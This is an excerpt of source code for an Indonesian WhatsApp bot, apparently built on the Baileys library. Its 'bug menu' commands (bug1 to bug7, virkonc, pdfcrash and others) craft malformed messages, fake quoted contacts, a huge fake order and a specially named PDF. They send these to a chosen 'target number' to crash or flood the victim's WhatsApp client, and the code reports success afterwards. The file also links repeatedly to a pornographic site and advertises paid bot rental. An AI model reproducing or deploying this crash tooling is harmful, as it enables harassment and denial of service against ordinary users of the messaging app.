...
key: {
fromMe: false, 
participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "6281991410940@s.whatsapp.net" } : {}) 
},
"message": {
"extendedTextMessage": {
"text": "ꪶ𝐖𝐫𝐚𝐧𝐳𝐓𝐚𝐦𝐩𝐚𝐧𝐳⿻ꫂ",
"previewType": "NONE",
"contextInfo": {
"stanzaId": "3EB0382EDBB2",
"participant": "13083102728@s.whatsapp.net"
	}}}}	
//=================================================//	
const kal = { 
key: {
...
"documentMessage": {
							...
							"fileName": `ꪶ𝐖𝐫𝐚𝐧𝐳𝐓𝐚𝐦𝐩𝐚𝐧𝐳⿻ꫂ${ngazap(prefix)}`,
...
//=================================================//
const bangkal= (teks) => {
haikal.sendMessage(m.chat, { text: teks, contextInfo:{"externalAdReply": {"title": `ꪶ𝐖𝐫𝐚𝐧𝐳𝐓𝐚𝐦𝐩𝐚𝐧𝐳⿻ꫂ 𝑪𝑹𝑨𝑺𝑯 𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐘`,"body": `🔥🔥🔥 ${pushname}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": kalimage,"sourceUrl": `https://www.xnxx.com/`}}}, { quoted: hw })
} 
//=================================================//
// Kontak
...
const bacito = (jid, text, quoted = fkontak) => haikal.sendMessage(jid, { text: text, contextInfo: { forwardingScore: 999, isForwarded: true,externalAdReply: {title: `ꪶ𝐖𝐫𝐚𝐧𝐳𝐓𝐚𝐦𝐩𝐚𝐧𝐳⿻ꫂ ${ngazap(prefix)}`, previewType:"PHOTO", thumbnail:fs.readFileSync('./lib/pict.jpg'), sourceUrl: `https://www.xnxx.com/` }}}, { quoted })
//=================================================//
//GCLINK
...
const bacit = (jid, text, quoted = fgclink) => haikal.sendMessage(jid, { text: text, contextInfo: { forwardingScore: 999, isForwarded: true,externalAdReply: {title: `ꪶ𝐖𝐫𝐚𝐧𝐳𝐓𝐚𝐦𝐩𝐚𝐧𝐳⿻ꫂ𝐘 ${ngazap(prefix)}`, previewType:"PHOTO", thumbnail:fs.readFileSync('./lib/pict.jpg'), sourceUrl: `https://www.xnxx.com/` }}}, { quoted })
//=================================================//
//Document
const fdoc = {key : {participant : '0@s.whatsapp.net'},message: {documentMessage: {title: `© ${ownername}`,jpegThumbnail: thumb}}}
const bacot = (jid, text, quoted = fdoc) => haikal.sendMessage(jid, { text: text, contextInfo: { forwardingScore: 999, isForwarded: true,externalAdReply: {title: `ꪶ𝐖𝐫𝐚𝐧𝐳𝐓𝐚𝐦𝐩𝐚𝐧𝐳⿻ꫂ ${ngazap(prefix)}`, previewType:"PHOTO", thumbnail:fs.readFileSync('./lib/pict.jpg'), sourceUrl: `https://www.xnxx.com/` }}}, { quoted })
//=================================================//
// VN 
...
const hwbro = (jid, text, quoted = fvn) => haikal.sendMessage(jid, { text: text, contextInfo: { forwardingScore: 999, isForwarded: true,externalAdReply: {title: `ꪶ𝐖𝐫𝐚𝐧𝐳𝐓𝐚𝐦𝐩𝐚𝐧𝐳⿻ꫂ ${ngazap(prefix)}`, previewType:"PHOTO", thumbnail:fs.readFileSync('./lib/pict.jpg'), sourceUrl: `https://www.xnxx.com/` }}}, { quoted })
//=================================================//
//Lokasi
const floc = {key : {participant : '0@s.whatsapp.net'},message: {locationMessage: {name: `${ownername}`,jpegThumbnail: thumb}}}
const hwmods = (jid, text, quoted = floc) => haikal.sendMessage(jid, { text: text, contextInfo: { forwardingScore: 999, isForwarded: true,externalAdReply: {title: `ꪶ𝐖𝐫𝐚𝐧𝐳𝐓𝐚𝐦𝐩𝐚𝐧𝐳⿻ꫂ ${ngazap(prefix)}`, previewType:"PHOTO", thumbnail:fs.readFileSync('./lib/pict.jpg'), sourceUrl: `https://www.xnxx.com/` }}}, { quoted })
//=================================================//
//Troli
...
const review = (jid, text, quoted = ftroli) => haikal.sendMessage(jid, { text: text, contextInfo: { forwardingScore: 999, isForwarded: true,externalAdReply: {title: `ꪶ𝐖𝐫𝐚𝐧𝐳𝐓𝐚𝐦𝐩𝐚𝐧𝐳⿻ꫂ ${ngazap(prefix)}`, previewType:"PHOTO", thumbnail:fs.readFileSync('./lib/pict.jpg'), sourceUrl: `https://www.xnxx.com/` }}}, { quoted })
//=================================================//
//image
...
const reply = (jid, text, quoted = cayalog) => haikal.sendMessage(jid, { text: text, contextInfo: { forwardingScore: 999, isForwarded: true,externalAdReply: {title: `ꪶ𝐖𝐫𝐚𝐧𝐳𝐓𝐚𝐦𝐩𝐚𝐧𝐳⿻ꫂ ${ngazap(prefix)}`, previewType:"PHOTO", thumbnail:fs.readFileSync('./lib/pict.jpg'), sourceUrl: `https://www.xnxx.com/` }}}, { quoted })
...
totalAmount1000: "500000000000000",
totalCurrencyCode: "IDR",
orderTitle: `ꪶ𝐖𝐫𝐚𝐧𝐳𝐓𝐚𝐦𝐩𝐚𝐧𝐳⿻ꫂ ${ngazap(prefix)}`,
...
let user = global.db.data.users[m.sender]
bangkal(`
𝐂𝐑𝚫𝐒𝐇 𝐇𝐎𝐌𝚵${user.afkReason ? ' Baiklah ' + user.afkReason : ''}
...
"url": "wa.me/13083102728"
},
"businessOwnerJid": "13083102728@s.whatsapp.net",
}
...
"productImage": messa.imageMessage,
"productId": "4383282311765462",
"title": `ꪶ𝐖𝐫𝐚𝐧𝐳𝐓𝐚𝐦𝐩𝐚𝐧𝐳⿻ꫂ${ngazap(prefix)}`,
"description": `ꪶ𝐖𝐫𝐚𝐧𝐳𝐓𝐚𝐦𝐩𝐚𝐧𝐳⿻ꫂ`,
"currencyCode": "IDR",
"footerText": `ꪶ𝐖𝐫𝐚𝐧𝐳𝐓𝐚𝐦𝐩𝐚𝐧𝐳⿻ꫂ`,
...
adehvn = { 
        ...
        message: { 
            "imageMessage": { 
                "mimetype": "image/jpeg", 
                "caption": `ꪶ𝐖𝐫𝐚𝐧𝐳𝐓𝐚𝐦𝐩𝐚𝐧𝐳⿻ꫂ${ngazap(prefix)}`, 
                "jpegThumbnail": thumb
            } 
        } 
    }
 hey = fs.readFileSync('gg.pdf')
 haikal.sendMessage(`${text}@s.whatsapp.net`, {document: hey, filename:`🌞𖧹͓͜͜͡𝑴͜͡𝑨͜͡҉𝑴͜͡𝑨͜͡҉𝑪͜͡𝑶͜͡𖧹͓͓󠇞𞥊.pdf`, mimetype: 'application/pdf',}, {quoted: adehvn})
await m.reply(`Berhasil Mengirim Bug Di Nomer ${text}@s.whatsapp.net`)
break
...
haikal.sendMessage(Pe, {text: "ꪶ𝐖𝐫𝐚𝐧𝐳𝐓𝐚𝐦𝐩𝐚𝐧𝐳⿻ꫂ"}, {quoted: a})
await sleep(10000)
...
Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
a = await haikal.sendMessage(m.chat, {react: { text: " ️", key: { remoteJid: m.chat, fromMe: true, id : m.key.id}}})
haikal.sendMessage(Pe, {text: "𝐙𝐘𝐑𝐄𝐍𝐍 𝑪𝑹𝑨𝑺𝑯 𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐘"}, {quoted: a})
await sleep(10000)
haikal.sendMessage(Pe, {text: "🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥"}, {quoted: a})
await sleep(10000)
haikal.sendMessage(Pe, {text: "𝐙𝐘𝐑𝐄𝐍𝐍 𝑪𝑹𝑨𝑺𝑯 𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐘"}, {quoted: a})
...
user.afkReason = text
bangkal(`${m.pushName} ꪶ𝐖𝐫𝐚𝐧𝐳𝐓𝐚𝐦𝐩𝐚𝐧𝐳⿻ꫂ${text ? ': ' + text : ''}`)
}
break
//=================================================//
case 'bug1': {
...
reply(m.chat, `ꪶ𝐖𝐫𝐚𝐧𝐳𝐓𝐚𝐦𝐩𝐚𝐧𝐳⿻ꫂ`, main)
}
break
//=================================================//
case 'bug2': {
...
hwmods(m.chat, `ꪶ𝐖𝐫𝐚𝐧𝐳𝐓𝐚𝐦𝐩𝐚𝐧𝐳⿻ꫂ`, main)
}
break
//=================================================//
case 'bug3': {
...
review(m.chat, `ꪶ𝐖𝐫𝐚𝐧𝐳𝐓𝐚𝐦𝐩𝐚𝐧𝐳⿻ꫂ`, main)
}
break
//=================================================//
case 'bug4': {
...
hwbro(m.chat, `ꪶ𝐖𝐫𝐚𝐧𝐳𝐓𝐚𝐦𝐩𝐚𝐧𝐳⿻ꫂ`, main)
}
break
//=================================================//
case 'bug5': {
...
"inviteExpiration": ` ꪶ𝐖𝐫𝐚𝐧𝐳𝐓𝐚𝐦𝐩𝐚𝐧𝐳⿻ꫂ`,
"groupName": `ꪶ𝐖𝐫𝐚𝐧𝐳𝐓𝐚𝐦𝐩𝐚𝐧𝐳⿻ꫂ ${ngazap(prefix)}`,
"caption": `ꪶ𝐖𝐫𝐚𝐧𝐳𝐓𝐚𝐦𝐩𝐚𝐧𝐳⿻ꫂ`
 }
   }
}
bacit(m.chat, `ꪶ𝐖𝐫𝐚𝐧𝐳𝐓𝐚𝐦𝐩𝐚𝐧𝐳⿻ꫂ`, main)
}
break
//=================================================//
case 'bug6': {
...
bacito(m.chat, `ꪶ𝐖𝐫𝐚𝐧𝐳𝐓𝐚𝐦𝐩𝐚𝐧𝐳⿻ꫂ`, main)
}
break
//=================================================//
case 'bug7': {
...
bacot(m.chat, `ꪶ𝐖𝐫𝐚𝐧𝐳𝐓𝐚𝐦𝐩𝐚𝐧𝐳⿻ꫂ`, main)
}
break
//=================================================//
case 'bugbutton': 
if (!isCreator) return
  const buttons = [
  {buttonId: `${prefix}ꪶ𝐖𝐫𝐚𝐧𝐳𝐓𝐚𝐦𝐩𝐚𝐧𝐳⿻ꫂ`, buttonText: {displayText: cttl}, type: 1},
  {buttonId: 'ꪶ𝐖𝐫𝐚𝐧𝐳𝐓𝐚𝐦𝐩𝐚𝐧𝐳⿻ꫂ', buttonText: {displayText: buttonvirus}, type: 1},
  {buttonId: 'ꪶ𝐖𝐫𝐚𝐧𝐳𝐓𝐚𝐦𝐩𝐚𝐧𝐳⿻ꫂ', buttonText: {displayText: ngazap}, type: 1}
]
...
break
case 'virkonc': {
           const fkontaak = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "@broadcast" } : {})}, message: { "contactMessage":{"displayName": `ꪶ𝐖𝐫𝐚𝐧𝐳𝐓𝐚𝐦𝐩𝐚𝐧𝐳⿻ꫂ${ngazap(prefix)}`,"vcard":`BEGIN:VCARD\nVERSION:3.0\nN:2;conn;;;\nFN:ꪶ𝐖𝐫𝐚𝐧𝐳𝐓𝐚𝐦𝐩𝐚𝐧𝐳⿻ꫂ\nitem1.TEL;waid=6281991410940:6281991410940\nitem1.X-ABLabel:Mobile\nEND:VCARD` }}}                          		
...
bangkal(`Session TicTacToe🎮 tidak ada`)
} else throw '?'
} catch (e) {
bangkal('rusak')
}
...
haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/1ae3c2e37108ba8d5c3e3.jpg' }, caption: `*Hai Kak ${m.pushName}*\n\n Bot Rental Prices\n⭔ 13k Per Group via E-Walet 1 Month\n⭔ 18k via pulsa 1 Month\n\n Premium Price Bot\n⭔ 8k per User 1 bulan\n\nPayment can be via Paypal/link aja/pulsa\n\nFor more details, you can chat with the owner\nhttps://wa.me/6281991410940 (Owner)\n\nDonate For Me : \n\n⭔ Paypal : https://trakteer.id/hw-mods-wa-haikal\n⭔ Saweria : https://saweria.co/hwmodswa` }, { quoted: hw })
}
break
//=================================================//
case 'sc': {
bangkal('My Web : https://www.xnxx.com/')
}
break
//=================================================//
case 'chat': {
...
case 'allmenu': {
if(typemenu == 'image'){
await haikal.send5ButImg(from, `` + '' + lang.menu(botname, pushname, salam), `© ${ownername}`,thumb, [{"urlButton": {displayText: "Script","url": `${youtube}`}},{"urlButton": {"displayText": `Trava Playsit`,"url": `${myweb}`}},{"quickReplyButton": {"displayText": "Owner","id": 'owner'}},{"quickReplyButton": {"displayText": "Bug Menu","id": 'bugmenu'}}] )
}
}
break
//=================================================//
case 'menu': {
anu = `╭──( Hay Tod ${pushname} 👋   ꪶ🜏ꫂ        )
│
║██▀░░░░░░░░░░░░░▀██
│█│░░░░░░░░░░░░░░░│█
║▌│░░░░░░░░░░░░░░░│▐
...
let btn = [{
urlButton: {
displayText: 'Script Bot WhatsApp',
url: 'https://www.xnxx.com/'
}
}, {
callButton: {
...
//=================================================//
case 'bot': {
buffer = await getBuffer(`https://telegra.ph/file/1ae3c2e37108ba8d5c3e3.jpg`)
...
║⿻ Virkonc [ 86 CTT ]
│⿻ Fotoc [ Nomor Target ]
║⿻ Pdfcrash [ Nomor Target ]
│⿻ Buglist [ New Md ]
║⿻ Virvidc [ Nomor Target ]
│⿻ Senbug [ Pilihan ]
║⿻ Bugvip [ Pilihan ]
│⿻ Jadibug1 [ Reply ]
║⿻ Jadibug2 [ Reply ]
